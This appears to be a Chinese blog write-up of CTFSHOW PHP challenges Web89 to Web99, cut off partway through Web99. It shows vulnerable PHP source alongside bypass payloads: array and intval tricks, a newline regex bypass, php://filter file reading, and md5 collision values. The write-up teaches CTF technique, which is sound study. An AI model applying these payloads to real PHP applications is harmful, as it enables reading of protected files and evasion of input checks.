<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>CTFSHOW-PHP - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="CTFSHOW-PHP - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/03/02/CTFSHOW-PHP/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T10:16:40.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/In-Challenge/">In Challenge</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">CTFSHOW-PHP</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="Web89（数组绕过）"><a href="#Web89（数组绕过）" class="headerlink" title="Web89（数组绕过）"></a>Web89（数组绕过）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662530209009-b1b4ad0b-dcce-4bbb-9f72-44555796d5ed.png#averageHue=%23fdfcfb&clientId=ube1b6a05-17c4-4&from=paste&height=189&id=u4a337c49&name=image.png&originHeight=236&originWidth=691&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53492&status=done&style=none&taskId=ua818c817-0d26-4b73-9dea-80b067955c6&title=&width=552.8" alt="image.png"><br>查看代码preg_match过滤0-9，即发现有0-9，就输出no no no然而intval函数的作用是返回变量的整数值，两者相互矛盾<br>这里可以通过数组绕过，构造payload: ?num[]&#x3D;<br>原理:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662530234252-a7d7c35d-68e4-4792-b729-46b013128c28.png#averageHue=%23f3f2f1&clientId=ube1b6a05-17c4-4&from=paste&height=116&id=u3b4a29aa&name=image.png&originHeight=145&originWidth=776&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39601&status=done&style=none&taskId=ud709562a-7a01-409d-992c-6a8a10d74d1&title=&width=620.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662530665707-39d51285-ee91-4d8d-957c-5958bb7a865f.png#averageHue=%23fefefe&clientId=ube1b6a05-17c4-4&from=paste&height=131&id=ua2128b8f&name=image.png&originHeight=164&originWidth=1088&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7259&status=done&style=none&taskId=udb701238-2105-4950-8c4a-0b1a7b05698&title=&width=870.4" alt="image.png"><br>且 preg_math()传入数组参数也会直接返回0<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662530716212-4f4ba96f-e222-4986-b339-abe15e409f7d.png#averageHue=%23e7e7e7&clientId=ube1b6a05-17c4-4&from=paste&height=82&id=u259d4887&name=image.png&originHeight=102&originWidth=1078&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32997&status=done&style=none&taskId=u015c9787-4704-4d8b-bfa2-4794aee86f4&title=&width=862.4" alt="image.png"><br>成功获取flag</p>
<h2 id="Web90（intval取整）"><a href="#Web90（intval取整）" class="headerlink" title="Web90（intval取整）"></a>Web90（intval取整）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662530734821-9784b830-9c45-430f-80f7-da31cf25aa21.png#averageHue=%23fefdfd&clientId=ube1b6a05-17c4-4&from=paste&height=189&id=u8e168c81&name=image.png&originHeight=236&originWidth=581&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30384&status=done&style=none&taskId=u5f119d1c-8d3c-47b0-bc78-703de66124c&title=&width=464.8" alt="image.png"><br>查看源码，第一个if是验证num是否被设置，第二个if验证num是否是4476，如果是，就输出no no no ，第三个if验证num取整后是否等于4476<br>看到取整，还不好做吗~，直接输入小数取整绕过第二个if的验证<br>payload?num&#x3D;4476.1</p>
<h2 id="Web91（换行绕过）"><a href="#Web91（换行绕过）" class="headerlink" title="Web91（换行绕过）"></a>Web91（换行绕过）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662530760076-b29f7e96-82a6-47a9-bd82-c987580d438c.png#averageHue=%23fefcfc&clientId=ube1b6a05-17c4-4&from=paste&height=213&id=u5eb55883&name=image.png&originHeight=266&originWidth=464&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27995&status=done&style=none&taskId=ua0d74436-ab92-4418-896b-bb1da3976ae&title=&width=371.2" alt="image.png"><br>查看源码<br>首先是<br>if(preg_match(‘&#x2F;^php$&#x2F;im’, $a)){这个if的意思是匹配$a开头和结尾是php，如果是php，进入下一个if<br>&#x2F;^php$&#x2F;im ^表示开头 $表示结尾 &#x2F;i不区分大小写 &#x2F;m表示多行匹配<br>preg_match(‘&#x2F;^php$&#x2F;i这个if的意思是匹配$a开头和结尾是php，不区分大小写，如果开头是php，那么就输出hacker<br>仔细对比发现，第二个if的过滤对比第一个，少了一个多行匹配&#x2F;m，这可以用到Apache HTTPD换行解析漏洞（CVE-2017-15715）<br>大概意思是：以前的1.php可以用1%0aphp访问，%0a表示换行符，那么综上所述，就可以绕过函数的过滤<br>构造payload: ?cmd&#x3D;a%0aphp<br>a%0aphp，首先是preg_match中的$(匹配结尾)匹配<strong>a%0aphp</strong>中的换行符，这个时候会匹配到%0a（将%0a当作换行），那么a%0aphp后面的php因为preg_match函数有个&#x2F;m(匹配多行)就是单独的一行了，满足第一个if，要求行开始和结尾都是php<br>其次是第二个if，第二个if要求$a中开头和结尾没有php，而这个preg_match函数中没有&#x2F;m匹配多行，所以就直接匹配abc，abc不满足第二个if，所以输出flag</p>
<h2 id="Web92（intval的性质）"><a href="#Web92（intval的性质）" class="headerlink" title="Web92（intval的性质）"></a>Web92（intval的性质）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接payload:?num&#x3D;4476.1或者intval()函数如果<img src="https://g.yuque.com/gr/latex?base%E4%B8%BA0%E5%88%99#card=math&code=base%E4%B8%BA0%E5%88%99&id=zS2b2">var中存在字母的话遇到字母就停止读取 payload2：?num&#x3D;4476a123<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662531073395-f3af0b86-f1a6-4dae-a1e2-c5016ae80c90.png#averageHue=%23fcfafa&clientId=ube1b6a05-17c4-4&from=paste&height=334&id=u8dba2040&name=image.png&originHeight=418&originWidth=628&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55803&status=done&style=none&taskId=u1c47048e-7881-4388-a9f7-73828d58399&title=&width=502.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662531916752-6b0eb935-abb6-4c5b-b80b-46bdb8fed81a.png#averageHue=%23f4f4f4&clientId=ube1b6a05-17c4-4&from=paste&height=114&id=u5a3a43ce&name=image.png&originHeight=143&originWidth=537&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24820&status=done&style=none&taskId=ued4011fc-5aaf-4911-a656-3710686d6e7&title=&width=429.6" alt="image.png"></p>
<h2 id="Web93（intval性质）"><a href="#Web93（intval性质）" class="headerlink" title="Web93（intval性质）"></a>Web93（intval性质）</h2><p>在web92的基础上<br>过滤了字母但是我们可以使用其他进制就是计算 0b?? : 二进制0??? : 八进制 0X?? : 16进制 payload ： ?num&#x3D;010574<br>当然直接4476.1梭哈也是可以的</p>
<h2 id="Web94（intval）"><a href="#Web94（intval）" class="headerlink" title="Web94（intval）"></a>Web94（intval）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>strpos():查找某一字符在字符串第一次出现的位置，返回值是数字（出现的位置），如果没找到返回FALSE</li>
</ul>
<p>这里是要我们的payload里面带有0，且第一位不能是0<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662531697681-86c96b96-3260-4376-a449-382211302f68.png#averageHue=%23fdfdfc&clientId=ube1b6a05-17c4-4&from=paste&height=170&id=u448ab248&name=image.png&originHeight=212&originWidth=1199&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16721&status=done&style=none&taskId=u5abd2001-3a80-419f-a541-5e0eb7b2a8a&title=&width=959.2" alt="image.png"><br>假如返回的是5，那么就是if(!5),这样就不会die掉，只有!0才会进入if语句内</p>
<p>直接payload：?num&#x3D;4476.0</p>
<h2 id="Web95（绕过strpos）"><a href="#Web95（绕过strpos）" class="headerlink" title="Web95（绕过strpos）"></a>Web95（绕过strpos）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这次比上题，多过滤了一个点“.”<br>要求不能有字母，不能有’.’，而且要求有0，0不能出现在第一位，如果我们直接八进制输入010574，strpos函数会返回0，因为0在第一位，我们要在最前面加一个空格绕过<br>payload:?num&#x3D;%20010574<br>payload2:?num&#x3D;+010574<br>payload3:?num&#x3D;%0a010574<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662532354191-3a04ea05-4bd4-4845-8e6b-1b6661475d1c.png#averageHue=%23fefdfd&clientId=ube1b6a05-17c4-4&from=paste&height=88&id=u2fcae74e&name=image.png&originHeight=110&originWidth=1070&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6444&status=done&style=none&taskId=ucb290fda-b0e3-4dd7-b20e-d954e4d1ddd&title=&width=856" alt="image.png"><br>空格不影响赋值,+号表示正数</p>
<h2 id="Web96（伪协议读文件）"><a href="#Web96（伪协议读文件）" class="headerlink" title="Web96（伪协议读文件）"></a>Web96（伪协议读文件）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload1：?u&#x3D;.&#x2F;flag.php<br>.&#x2F;表示当前目录<br>payload2：?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>使用伪协议读取</p>
<h2 id="Web97（md5绕过）"><a href="#Web97（md5绕过）" class="headerlink" title="Web97（md5绕过）"></a>Web97（md5绕过）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里要输入两个不同的a,b，<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>弱类型比较可以直接数组过，其结果都会转换为null<br>所以payload1：a[]&#x3D;1&amp;b[]&#x3D;2，用POST传参<br>payload2弱碰撞：<br>md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。 payload: a&#x3D;QNKCDZO&amp;b&#x3D;240610708<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662623944241-6233264a-d3eb-4aee-98d6-41c041b7e579.png#averageHue=%23fefefd&clientId=u6fe82327-ba50-4&from=paste&height=279&id=ub3892b37&name=image.png&originHeight=349&originWidth=1248&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13664&status=done&style=none&taskId=u9ac0eb03-c215-4dfb-962f-ae683bb311e&title=&width=998.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662623954127-cb313587-a23e-43e8-8048-251d57e86b4a.png#averageHue=%23fefefe&clientId=u6fe82327-ba50-4&from=paste&height=315&id=uf373c0ea&name=image.png&originHeight=394&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14561&status=done&style=none&taskId=u544bc980-5798-4e7c-b4ec-985583d09d2&title=&width=1049.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662623966611-eed83020-8bc1-4534-9ded-8915bf4884a9.png#averageHue=%23fefefe&clientId=u6fe82327-ba50-4&from=paste&height=222&id=u42bd9054&name=image.png&originHeight=278&originWidth=1342&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12688&status=done&style=none&taskId=u2966e317-d69b-4c6c-bf32-5e7a420f1b4&title=&width=1073.6" alt="image.png"><br>payload3强碰撞：<br>这时候需要找到两个真正的md5值相同数据<br>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2_<br><em>&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB</em>%07%FE%A2</p>
<h2 id="Web98（三元运算符和指针）"><a href="#Web98（三元运算符和指针）" class="headerlink" title="Web98（三元运算符和指针）"></a>Web98（三元运算符和指针）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>这里涉及了三元运算符<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662533428199-daab1813-b98f-46b3-ba0d-3cabd3b48e9f.png#averageHue=%23f4f2f0&clientId=ube1b6a05-17c4-4&from=paste&height=86&id=u6d6479b7&name=image.png&originHeight=108&originWidth=1011&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28558&status=done&style=none&taskId=u51a3b852-db9b-4c88-ad44-fe7d1611900&title=&width=808.8" alt="image.png"><br>我们把这几段代码都分析一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">===============&gt;<span class="comment">//意思就是下面的代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">	<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他的也是同理如：$_GET[‘flag’]&#x3D;&#x3D;’flag’?$_GET&#x3D;&amp;$_COOKIE:’flag’;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这上面三条其中&amp;表示传递地址，和指针的作用类似，将$_GET指向$_POST或者$_COOKIE<br>所以有两种payload1：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662533451972-e90ca271-9479-44d2-9866-dc47c2d07e81.png#averageHue=%23f9f9f9&clientId=ube1b6a05-17c4-4&from=paste&height=218&id=ua68e6f14&name=image.png&originHeight=273&originWidth=823&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40760&status=done&style=none&taskId=u71f70de8-f227-4d1a-9441-a4e185a1681&title=&width=658.4" alt="image.png"><br>GET随便传点什么都可以<br>首先GET存在，$_GET指针指向$_POST<br>$_POST[‘HTTP_FLAG’]&#x3D;flag的话<br>GET数组里面也会有$_GET[‘HTTP_FLAG’]&#x3D;flag<br>下面的payload2同理<br>payload2：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662533478236-20f2c513-030f-42c4-8728-c748b30854aa.png#averageHue=%23fbfbfb&clientId=ube1b6a05-17c4-4&from=paste&height=378&id=u65b450ae&name=image.png&originHeight=473&originWidth=808&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60884&status=done&style=none&taskId=u2a719b3d-7937-483a-86e9-bdfaff2bad2&title=&width=646.4" alt="image.png"><br>流程：首先$_POST[flag]&#x3D;flag<br>所以GET里面也有$_GET[flag]&#x3D;flag，进入第二条判断，$_GET&#x3D;&amp;$_cookie指向cookie<br>cookie传入HTTP_FLAG&#x3D;flag<br>这里其实也会进入server的判断，但是由于$_server没有传值，不影响<br>GET里面多出一个$_GET[HTTP_FLAG]&#x3D;flag,完成最终判断</p>
<h2 id="Web99（in-array漏洞）"><a href="#Web99（in-array漏洞）" class="headerlink" title="Web99（in_array漏洞）"></a>Web99（in_array漏洞）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;   <span class="comment">//0X36d是十六进制，对应877</span></span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 